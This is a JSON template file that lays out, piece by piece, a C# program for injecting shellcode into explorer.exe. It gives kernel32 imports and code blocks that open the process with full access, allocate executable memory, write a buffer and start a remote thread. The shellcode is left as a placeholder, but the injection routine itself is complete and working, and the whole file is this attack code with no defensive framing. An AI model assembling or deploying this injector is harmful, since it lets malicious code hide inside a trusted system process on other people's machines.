{
    "ProcessInjection": {
        "directives": [
            "using System;",
            "using System.Runtime.InteropServices;",
            "using System.Diagnostics;"
        ],
        "imports": [
            {
                "library": "kernel32.dll",
                "functions": [
                    {
                        "name": "OpenProcess",
                        "signature": "IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);",
                        "attributes": "[DllImport(\"kernel32.dll\", SetLastError = true)]"
                    },
                    {
                        "name": "VirtualAllocEx",
                        "signature": "IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);",
                        "attributes": "[DllImport(\"kernel32.dll\", SetLastError = true)]"
                    },
                    {
                        "name": "WriteProcessMemory",
                        "signature": "bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);",
                        "attributes": "[DllImport(\"kernel32.dll\", SetLastError = true)]"
                    },
                    {
                        "name": "CreateRemoteThread",
                        "signature": "IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);",
                        "attributes": "[DllImport(\"kernel32.dll\", SetLastError = true)]"
                    }
                ]
            }
        ],
        "code_blocks": {
            "main": [
                "Console.WriteLine(\"[*] Shellcode Injection into explorer.exe\");",
                "PLACEHOLDER_SHELLCODE"
            ],
            "get_process": [
                "Process[] processes = Process.GetProcessesByName(\"explorer\");",
                "if (processes.Length == 0)",
                "{",
                "    Console.WriteLine(\"[!] Explorer.exe not found.\");",
                "    return;",
                "}",
                "uint processId = (uint)processes[0].Id;"
            ],
            "open_process": [
                "IntPtr hProcess = OpenProcess(0x001F0FFF, false, processId);",
                "if (hProcess == IntPtr.Zero)",
                "{",
                "    Console.WriteLine(\"[!] Failed to open process.\");",
                "    return;",
                "}",
                "Console.WriteLine($\"[+] Opened process with ID: {processId}\");"
            ],
            "memory_allocation": [
                "Console.WriteLine($\"[*] Allocating {buf.Length} bytes in remote process...\");",
                "IntPtr allocMem = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x1000 | 0x2000, 0x40);",
                "if (allocMem == IntPtr.Zero)",
                "{",
                "    Console.WriteLine(\"[!] Memory allocation failed.\");",
                "    return;",
                "}",
                "Console.WriteLine($\"[+] Allocated memory at: 0x{allocMem.ToInt64():X}\");"
            ],
            "write_memory": [
                "IntPtr bytesWritten;",
                "bool writeMem = WriteProcessMemory(hProcess, allocMem, buf, (uint)buf.Length, out bytesWritten);",
                "if (!writeMem)",
                "{",
                "    Console.WriteLine(\"[!] WriteProcessMemory failed.\");",
                "    return;",
                "}",
                "Console.WriteLine(\"[+] Shellcode written!\");"
            ],
            "execute_shellcode": [
                "Console.WriteLine(\"[*] Creating remote thread...\");",
                "IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, allocMem, IntPtr.Zero, 0, IntPtr.Zero);",
                "if (hThread == IntPtr.Zero)",
                "{",
                "    Console.WriteLine(\"[!] CreateRemoteThread failed.\");",
                "    return;",
                "}",
                "Console.WriteLine($\"[+] Remote thread created at: 0x{hThread.ToInt64():X}\");",
                "Console.WriteLine(\"[*] Injection complete.\");",
                "Console.ReadLine();"
            ]
        }
    }
}
